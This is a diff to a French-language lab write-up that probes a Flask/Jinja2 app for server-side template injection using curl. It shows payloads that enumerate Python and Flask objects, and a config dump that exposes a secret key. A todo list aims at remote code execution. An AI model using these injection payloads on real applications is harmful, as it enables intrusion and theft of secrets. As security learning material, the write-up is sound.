@@ -351,3 +351,120 @@ Avec `X-Debug-Render` a `true` :
 -d "project_name={{7*7}}"
 Project under evaluation: 49
 ```
+
+##### Todo list pour attaquer via SSTI :
+
+- [x] Expression Mathematique.
+- [x] Expression Jinja2 simple
+- [x] Variables du ctx 
+- [ ] Objets Flask 
+- [ ] Objets Python
+- [ ] Acces aux classes / attributs
+- [ ] Interaction systeme
+- [ ] RCE
+
+##### Petit stop pedagogique, j'ai jamais touche a Python, c'est le moment d'essayer de comprendre un peu : 
+En python, presque tout ce qu'on sera amene a manipuler est un objet. : 
+```
+42 --> est une instance de int
+"hello" --> est une instance de str 
+```  
+Python permet de recuperer la classe d'un objet avec `__class__`. La doc decrit que chaque valeur est un objet et que sa classe est accessble via `object.__class__`.
+
+Ok, c'etait surtout la synthaxe qui me perturbait, ca reste de la POO classique dans les faits.
+
+Dans le cadre de la todo, j'ai donc essaye : `{{ ''.__class__ }}` pour lui demander : Prends cette chaine vide et donne moi sa classe.  
+`''` est une instance de `str`.
+
+*P.S: Flask applique un auto-escaping HTML, rendant l'output difficilement intelligible, j'ai donc ce [script](./scripts/jinja2_rewrite.sh) qui permet de remplacer les escape par les caracteres*  
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ ''.__class__ }}"       
+Project under evaluation: &lt;class &#39;str&#39;&gt;
+┌──(kali㉿kali)-[~]
+└─$ ./jinja_rewrite.sh test_str_dump
+Project under evaluation: <class 'str'>
+```  
+###### Expression Jinja2 simple :  
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ 'hello'.upper() }}"
+Project under evaluation: HELLO
+```  
+##### Variables du ctx : 
+1. `{{ config }}`
+```bash
+╰─ ./jinja2_rewrite.sh flask_config_dump                                                             ─╯
+Project under evaluation: <Config {'DEBUG': False,
+ 'TESTING': False,
+ 'PROPAGATE_EXCEPTIONS': None,
+ 'SECRET_KEY': 'hal9042secret',
+ 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31),
+ 'USE_X_SENDFILE': False,
+ 'SERVER_NAME': None,
+ 'APPLICATION_ROOT': '/',
+ 'SESSION_COOKIE_NAME': 'session',
+ 'SESSION_COOKIE_DOMAIN': None,
+ 'SESSION_COOKIE_PATH': None,
+ 'SESSION_COOKIE_HTTPONLY': True,
+ 'SESSION_COOKIE_SECURE': False,
+ 'SESSION_COOKIE_SAMESITE': None,
+ 'SESSION_REFRESH_EACH_REQUEST': True,
+ 'MAX_CONTENT_LENGTH': None,
+ 'SEND_FILE_MAX_AGE_DEFAULT': None,
+ 'TRAP_BAD_REQUEST_ERRORS': None,
+ 'TRAP_HTTP_EXCEPTIONS': False,
+ 'EXPLAIN_TEMPLATE_LOADING': False,
+ 'PREFERRED_URL_SCHEME': 'http',
+ 'TEMPLATES_AUTO_RELOAD': None,
+ 'MAX_COOKIE_SIZE': 4093}>
+```
+2. `{{ request }}`
+```bash
+╰─ ./jinja2_rewrite.sh request_dump                                                                  ─╯
+Project under evaluation: <Request 'http://10.0.2.2/evaluate\&\#39\; [POST]>
+```
+3. `{{ session }}`
+```bash
+╰─ ./jinja2_rewrite.sh session_dump                                                                  ─╯
+Project under evaluation: <SecureCookieSession {}>
+```
+4. `{{ g }}`
+```bash
+╰─ ./jinja2_rewrite.sh g_dump                                                                        ─╯
+Project under evaluation: <flask.g of 'app'>
+```
+##### Objets Flask : 
+
+C'est interessant, `{{ config }}` a repondu, on va dig les objets Flask :  
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ config.__class__.__name__ }}"
+Project under evaluation: Config
+                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ session.__class__.__name__ }}"
+Project under evaluation: SecureCookieSession
+                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ g.__class__.__name__ }}"
+Project under evaluation: _AppCtxGlobals
+                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ request.__class__.__name__ }}"
+Project under evaluation: Request
+```
